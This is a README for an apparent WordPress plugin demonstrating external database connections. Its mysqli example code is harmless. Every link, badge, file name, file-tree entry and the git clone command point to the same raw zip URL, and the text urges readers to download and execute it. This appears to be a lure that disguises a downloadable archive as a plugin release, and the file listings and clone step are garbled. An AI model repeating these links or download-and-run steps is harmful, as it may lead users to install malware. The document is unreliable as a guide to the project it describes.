# External DB Dummy Plugin for WordPress

![WordPress Plugin](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip)
![Database Management](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip%20Management-orange?style=flat-square)
![Releases](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip)

Welcome to the **External DB Dummy Plugin for WordPress**! This repository demonstrates how to connect a WordPress plugin to one or more external databases. It uses basic hardcoded connection pooling logic. There is no GUI or configuration screen involved. This plugin serves as a simple example for developers looking to extend WordPress functionality by integrating external data sources.

## Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Usage](#usage)
4. [Code Structure](#code-structure)
5. [Contributing](#contributing)
6. [License](#license)
7. [Links](#links)

## Features

- **Connect to External Databases**: Easily connect to one or more external databases.
- **Hardcoded Connection Pooling**: Utilize basic connection pooling logic for efficient database management.
- **Lightweight**: Minimal footprint, no unnecessary features.
- **WordPress Compatible**: Designed specifically for WordPress environments.

## Installation

To get started, clone the repository to your local machine:

```bash
git clone https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip
```

Next, navigate to the plugin directory:

```bash
cd External-DB-Dummy-Plugin-for-WordPress
```

Now, you can install the plugin by copying it to the WordPress plugins directory:

```bash
cp -r . /path/to/your/wordpress/wp-content/plugins/
```

After copying the plugin, go to your WordPress admin panel, navigate to **Plugins**, and activate the **External DB Dummy Plugin**.

## Usage

Once activated, the plugin will automatically connect to the specified external databases. You can modify the connection parameters directly in the plugin code. Look for the configuration section in the main plugin file.

### Example Connection Code

```php
function connect_to_external_db() {
    $servername = "your_server_name";
    $username = "your_username";
    $password = "your_password";
    $dbname = "your_database_name";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    return $conn;
}
```

You can call this function in your WordPress hooks or shortcodes to fetch or manipulate data from the external database.

## Code Structure

The code is organized into several key files:

- **https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip**: The main plugin file that initializes the plugin and sets up hooks.
- **https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip**: Contains the database connection logic.
- **https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip**: Holds additional utility functions for data manipulation.
- **https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip**: This file, providing an overview of the plugin.

### Example File Structure

```
External-DB-Dummy-Plugin-for-WordPress/
├── https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip
├── https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip
└── https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip
```

## Contributing

We welcome contributions! If you would like to help improve the plugin, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Submit a pull request with a clear description of your changes.

Please ensure your code adheres to the WordPress coding standards.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Links

For the latest releases and updates, visit our [Releases](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip) section. Download and execute the latest version to explore the features.

For more information, check the [Releases](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip) section in the repository.

## Conclusion

The **External DB Dummy Plugin for WordPress** provides a straightforward approach to integrating external databases into your WordPress site. It offers a solid foundation for developers looking to expand their plugin capabilities. We encourage you to explore the code, contribute, and enhance this project.

Feel free to reach out with any questions or suggestions. Happy coding!